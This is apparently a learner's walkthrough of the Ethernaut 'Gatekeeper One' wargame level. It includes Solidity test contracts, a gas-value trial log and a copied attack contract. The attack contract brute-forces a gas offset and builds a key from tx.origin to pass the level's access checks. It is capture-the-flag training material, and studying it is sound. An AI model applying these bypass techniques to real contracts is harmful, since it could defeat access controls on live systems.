# 13. Gatekeeper One
Make it past the gatekeeper and register as an entrant to pass this level.
Things that might help:

    Remember what you've learned from the Telephone and Token levels.
    You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).

gateOne()
- same as 4. Telephone

gateThree()
- make a test contract in remix 
	- starting from part 3: casting the address to a uint16 will take the last 2 bytes, thus using gateKey = 0x000000000000xxxx (where xxxx is last 2 bytes of tx.origin) satisfies this because casting this as uint64 then uin32 will give xxxx as an int
	- to part 2: left side of the statement is exactly the same as part 3, but it has to be different from a uin64 cast of the key. thus adding a  bit anywhere outside of the last 32 bits satisfies this gate (ie anything between 0x000000010000xxxx - 0x100000000000xxxx)
	- this also passes part 1

test.sol
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract test {
//uint32(uint64(_gateKey)) == uint16(tx.origin)

    address tx_origin = 0x495f947276749Ce646f68AC8c248420045cb7b5e;
    
    function testcast_1(bytes8 _gateKey) public view returns (bool) {
        return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
    }
    
    function testcast_2(bytes8 _gateKey) public view returns (bool) {
        return uint32(uint64(_gateKey)) != uint64(_gateKey);
    }
    
    function testcasts_3(bytes8 _gateKey) public view returns (bool) {
        return uint32(uint64(_gateKey)) == uint16(tx_origin);
    }
    
}
```

gateTwo()
- was close, had to check a guide:
- https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009
used a test contract to find gas
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }
  
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract test {
    GatekeeperOne one;

    function set (GatekeeperOne gko) public { one = gko; }
    
    function call_enter(bytes8 _gateKey, uint256 gas) public { 
        address(one).call.gas(gas)(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
}
```

set(address)
call_enter(0x100000000000ddC4, 999999)

using debugger to "step into" code and get "remaining gas" for each opcode in the `require(gasleft().mod(8191) == 0);` part

then getting the difference using 99999-(remaining_gas % 8191), and checking `entrant` after each call

999756/no
999753/no
999750/no
999747/no
999745/yes
999742
999739
999736
999733
999730
999727

when sending address shows up in entrant, that is the gas to use

none of the solutions worked so had to piece together info from different pages:
https://forum.openzeppelin.com/t/lvl-13-gatekeeper-one-question/6565
https://github.com/0age/ethernaut/blob/master/contracts/attacks/GatekeeperOneAttack.sol

```
pragma solidity ^0.6.0;

contract GatekeeperOneAttack {

  constructor(address GatekeeperOneContractAddress) public {
    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
    
    // NOTE: the proper gas offset to use will vary depending on the compiler
    // version and optimization settings used to deploy the factory contract.
    // To migitage, brute-force a range of possible values of gas to forward.
    // Using call (vs. an abstract interface) prevents reverts from propagating.
    bytes memory encodedParams = abi.encodeWithSelector(
      bytes4(keccak256("enter(bytes8)")),
      key
    );

    // gas offset usually comes in around 210, give a buffer of 60 on each side
    for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = address(GatekeeperOneContractAddress).call.gas(
          i + 150 + 8191 * 3
        )(
          encodedParams
        );
      if (result) {
        break;
      }
    }
  }
}
```

**end**
Well done! Next, try your hand with the second gatekeeper...
